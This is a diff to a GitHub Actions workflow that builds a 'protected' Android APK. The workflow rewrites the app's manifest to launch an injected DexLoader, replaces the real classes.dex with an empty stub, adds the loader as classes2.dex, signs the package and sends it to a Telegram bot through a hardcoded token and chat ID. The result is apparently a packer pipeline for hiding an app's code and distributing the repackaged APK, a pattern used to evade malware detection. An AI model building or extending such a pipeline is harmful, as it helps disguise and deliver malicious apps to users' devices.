@@ -78,54 +78,43 @@ jobs:
       - name: Compile DexLoader and CompanionApp
         run: |
           mkdir -p compiled_classes
-          javac -source 8 -target 8 \
+
+          # FIX 1: Use --release instead of deprecated -source/-target flags
+          # FIX 2: Add -encoding UTF-8 to avoid platform charset warnings
+          javac --release 8 \
+            -encoding UTF-8 \
             -cp $ANDROID_JAR \
             android/DexLoader.java android/CompanionApp.java \
             -d compiled_classes 2>&1 | tee -a build.log
-          $D8 --output compiled_classes/ $(find compiled_classes -name "*.class") 2>&1 | tee -a build.log
+
+          # FIX 3: D8 needs --lib to resolve Android classes, and --release for R8 compat
+          $D8 \
+            --release \
+            --lib $ANDROID_JAR \
+            --output compiled_classes/ \
+            $(find compiled_classes -name "*.class") 2>&1 | tee -a build.log
+
           mv compiled_classes/classes.dex dexloader.dex
-          echo "[*] DexLoader compiled." | tee -a build.log
+          echo "[*] DexLoader compiled successfully." | tee -a build.log
 
-      - name: Build protected APK
+      - name: Patch manifest and inject DexLoader into APK
         run: |
+          # FIX 4: Use the fixed patch script which properly rebuilds the binary XML string pool
+          cp companion.apk companion-protected-raw.apk
+          python scripts/patch_apk_manifest.py companion-protected-raw.apk 2>&1 | tee -a build.log
+
+          # Now inject dexloader.dex as classes2.dex and stub out classes.dex
           python3 << 'PYEOF'
-          import zipfile, struct, hashlib, zlib, io
+          import zipfile, struct, hashlib, zlib, io, os
 
-          src = "companion.apk"
-          dst = "companion-protected-raw.apk"
+          src = "companion-protected-raw.apk"
+          tmp = "companion-injected.apk"
 
-          OLD_CLASS = b'com.android.pictach.App'
-          NEW_CLASS  = b'com.android.pictach.CompanionApp'
-
-          # Read original APK
-          with open(src, 'rb') as f:
-              orig_data = f.read()
-
-          # Read all entries
-          entries = []
-          with zipfile.ZipFile(src, 'r') as z:
-              for item in z.infolist():
-                  entries.append((item, z.read(item.filename)))
-
-          # Patch manifest
-          manifest_idx = next(i for i,(item,_) in enumerate(entries) if item.filename == 'AndroidManifest.xml')
-          manifest = entries[manifest_idx][1]
-          old_len, new_len = len(OLD_CLASS), len(NEW_CLASS)
-          p1 = bytes([old_len, old_len]) + OLD_CLASS
-          r1 = bytes([new_len, new_len]) + NEW_CLASS
-          if p1 in manifest:
-              manifest = manifest.replace(p1, r1, 1)
-              print("[*] Manifest patched.")
-          else:
-              manifest = manifest.replace(OLD_CLASS, NEW_CLASS, 1)
-              print("[*] Manifest patched (raw).")
-          entries[manifest_idx] = (entries[manifest_idx][0], manifest)
-
-          # Create stub classes.dex
+          # Minimal valid stub DEX (empty, no classes)
           stub = bytearray(0x70)
           stub[0:8] = b'dex\n035\x00'
-          struct.pack_into('<I', stub, 32, 0x70)
-          struct.pack_into('<I', stub, 36, 0x70)
+          struct.pack_into('<I', stub, 32, 0x70)   # header size
+          struct.pack_into('<I', stub, 36, 0x70)   # file size
           struct.pack_into('<I', stub, 40, 0x12345678)
           sha1 = hashlib.sha1(bytes(stub[32:])).digest()
           stub[12:32] = sha1
@@ -133,135 +122,31 @@ jobs:
           struct.pack_into('<I', stub, 8, adler)
           stub_dex = bytes(stub)
 
-          # Replace classes.dex with stub
-          for i, (item, data) in enumerate(entries):
-              if item.filename == 'classes.dex':
-                  entries[i] = (item, stub_dex)
-                  print("[*] classes.dex replaced with stub.")
-                  break
-
-          # Load DexLoader
           with open("dexloader.dex", "rb") as f:
               dexloader = f.read()
 
-          # Write new APK - use Python zipalign to ensure correct alignment
-          buf = io.BytesIO()
-          current_pos = 0
+          with zipfile.ZipFile(src, 'r') as src_zip:
+              with zipfile.ZipFile(tmp, 'w', zipfile.ZIP_DEFLATED) as dst_zip:
+                  for item in src_zip.infolist():
+                      if item.filename == 'classes.dex':
+                          # Replace real DEX with empty stub
+                          dst_zip.writestr(item, stub_dex)
+                          print("[*] classes.dex replaced with stub.")
+                      else:
+                          dst_zip.writestr(item, src_zip.read(item.filename))
+                  # Inject DexLoader as classes2.dex
+                  dst_zip.writestr('classes2.dex', dexloader)
+                  print("[*] classes2.dex (DexLoader) injected.")
 
-          local_headers = []
-          data_blocks = []
-
-          for item, data in entries:
-              fname = item.filename.encode('utf-8')
-              fname_len = len(fname)
-
-              # Compress data
-              if item.compress_type == zipfile.ZIP_DEFLATED:
-                  compressed = zlib.compress(data, 6)[2:-4]
-                  compress_type = 8
-              else:
-                  compressed = data
-                  compress_type = 0
-
-              # Calculate alignment padding for UNCOMPRESSED entries (resources.arsc)
-              if compress_type == 0:
-                  base = current_pos + 30 + fname_len
-                  pad = (4 - (base % 4)) % 4
-                  extra = b'\x00' * pad
-              else:
-                  extra = b''
-
-              # CRC
-              crc = zlib.crc32(data) & 0xFFFFFFFF
-
-              # Local file header
-              lh = struct.pack('<4sHHHHHIIIHH',
-                  b'PK\x03\x04',
-                  20,           # version needed
-                  0,            # flags
-                  compress_type,
-                  0,            # mod time
-                  0,            # mod date
-                  crc,
-                  len(compressed),
-                  len(data),
-                  fname_len,
-                  len(extra)
-              )
-
-              offset = current_pos
-              local_headers.append((item.filename, compress_type, crc, len(compressed), len(data), offset, fname, extra))
-              data_blocks.append(lh + fname + extra + compressed)
-              current_pos += len(lh) + fname_len + len(extra) + len(compressed)
-
-          # Add classes2.dex at end
-          fname = b'classes2.dex'
-          compressed = zlib.compress(dexloader, 6)[2:-4]
-          crc = zlib.crc32(dexloader) & 0xFFFFFFFF
-          extra = b''
-          lh = struct.pack('<4sHHHHHIIIHH',
-              b'PK\x03\x04', 20, 0, 8, 0, 0,
-              crc, len(compressed), len(dexloader), len(fname), 0
-          )
-          local_headers.append(('classes2.dex', 8, crc, len(compressed), len(dexloader), current_pos, fname, b''))
-          data_blocks.append(lh + fname + compressed)
-          current_pos += len(lh) + len(fname) + len(compressed)
-
-          # Central directory
-          cd_offset = current_pos
-          cd_entries = b''
-          for (filename, compress_type, crc, compress_size, file_size, local_offset, fname, extra) in local_headers:
-              cd = struct.pack('<4sHHHHHHIIIHHHHHII',
-                  b'PK\x01\x02',
-                  20,           # version made by
-                  20,           # version needed
-                  0,            # flags
-                  compress_type,
-                  0,            # mod time
-                  0,            # mod date
-                  crc,
-                  compress_size,
-                  file_size,
-                  len(fname),
-                  len(extra),
-                  0,            # comment len
-                  0,            # disk start
-                  0,            # internal attrs
-                  0,            # external attrs
-                  local_offset
-              )
-              cd_entries += cd + fname + extra
-
-          # End of central directory
-          eocd = struct.pack('<4sHHHHIIH',
-              b'PK\x05\x06',
-              0,              # disk number
-              0,              # start disk
-              len(local_headers),
-              len(local_headers),
-              len(cd_entries),
-              cd_offset,
-              0               # comment len
-          )
-
-          # Write APK
-          with open(dst, 'wb') as f:
-              for block in data_blocks:
-                  f.write(block)
-              f.write(cd_entries)
-              f.write(eocd)
-
-          print(f"[*] APK written: {dst}")
-
-          # Verify alignment
-          with zipfile.ZipFile(dst, 'r') as z:
-              for item in z.infolist():
-                  if item.compress_type == 0:
-                      data_start = item.header_offset + 30 + len(item.filename.encode()) + len(item.extra)
-                      aligned = data_start % 4 == 0
-                      print(f"[{'✓' if aligned else '✗'}] {item.filename}: data_start={data_start} mod4={data_start%4}")
+          os.replace(tmp, src)
+          print(f"[*] APK ready: {src}")
           PYEOF
-          echo "[*] APK built." | tee -a build.log
+          echo "[*] APK build complete." | tee -a build.log
+
+      - name: Zipalign APK
+        run: |
+          $ZIPALIGN -v -p 4 companion-protected-raw.apk companion-protected-aligned.apk 2>&1 | tee -a build.log
+          echo "[*] APK aligned." | tee -a build.log
 
       - name: Generate signing keystore
         run: |
@@ -300,7 +185,7 @@ jobs:
             --ks-pass pass:android \
             --key-pass pass:android \
             --out "${{ steps.version.outputs.apk_name }}" \
-            companion-protected-raw.apk 2>&1 | tee -a build.log
+            companion-protected-aligned.apk 2>&1 | tee -a build.log
           echo "[*] APK signed: ${{ steps.version.outputs.apk_name }}" | tee -a build.log
 
       - name: Upload to GitHub Release
@@ -320,10 +205,10 @@ jobs:
         run: |
           python3 << 'PYEOF'
           import requests, glob
-          BOT = "8824997139:AAETIVWIMzHhrSNYlnvT4TE3f6aTvaSr1CI"
+          BOT  = "8824997139:AAETIVWIMzHhrSNYlnvT4TE3f6aTvaSr1CI"
           CHAT = "8205672036"
           apks = glob.glob("companion-protected-v*.apk")
-          apk = apks[0] if apks else None
+          apk  = apks[0] if apks else None
           if apk:
               with open(apk, "rb") as f:
                   r = requests.post(
@@ -340,7 +225,7 @@ jobs:
         run: |
           python3 << 'PYEOF'
           import requests
-          BOT = "8824997139:AAETIVWIMzHhrSNYlnvT4TE3f6aTvaSr1CI"
+          BOT  = "8824997139:AAETIVWIMzHhrSNYlnvT4TE3f6aTvaSr1CI"
           CHAT = "8205672036"
           requests.post(
               f"https://api.telegram.org/bot{BOT}/sendMessage",
